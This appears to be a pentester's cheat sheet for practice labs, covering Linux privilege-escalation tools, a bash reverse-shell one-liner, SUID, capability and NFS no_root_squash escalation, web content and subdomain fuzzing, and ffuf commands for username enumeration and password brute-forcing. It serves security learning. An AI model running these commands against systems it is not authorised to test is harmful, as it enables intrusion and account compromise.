# Useful-git-links

## Priviledge escalation Linux:
LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS <br>
LinEnum: https://github.com/rebootuser/LinEnum<br>
LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester<br>
Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration<br>
Linux Priv Checker: https://github.com/linted/linuxprivchecker<br>

Linux vuln exploit: https://gtfobins.github.io/

# Useful commands

## Priviledge escalation Linux:
Exploit for every sudo app for the user: ```sudo -l``` <br>
Reverse shell command:  ```bash -i >& /dev/tcp/"ip"/"port" 0>&1```<br>
Find SUID bit: ```find / -type f -perm -04000 -ls 2>/dev/null```<br>
Find capabilities: ``getcap -r / 2>/dev/null`` <br>

### NFS
Find if there is NFS on : `cat /etc/exports`  (Need "no_root_squash" option on shared folder)
On another machine: 

    showmount -e "ip"
    mkdir /tmp/attackerbackup
    mount -o rw "ip":/"shared_folder" /tmp/attackerbackup
    Then add a new program that launch a shell and compile it, run it on the victim machine

## Content discovery web
Wordlist pour TOUT: https://github.com/danielmiessler/SecLists/tree/master

    ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.28.209/FUZZ

    dirb http://10.10.28.209/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

    gobuster dir --url http://10.10.28.209/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

## Subdomain discovery
Automated tool: https://github.com/aboul3la/Sublist3r

    ./sublist3r.py -d <website url>
Virtual hosts: 

    ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
## Username discovery
Fuzzing github: https://github.com/ffuf/ffuf

    ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.229.11/customers/signup -mr "username already exists" 
    
-w: wordlist, -X: request method, -d:data, -H: Extra headers, -u: URL, -mr: success text to find in the page if username already used 

## Authentication bypass

    ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.229.11/customers/login -fc 200

-w: wordlist (:W1 = username, :W2 = passwords), -fc: check for HTTP Status Code to filter (in this case, filter 200)

## Hash craking
https://crackstation.net/
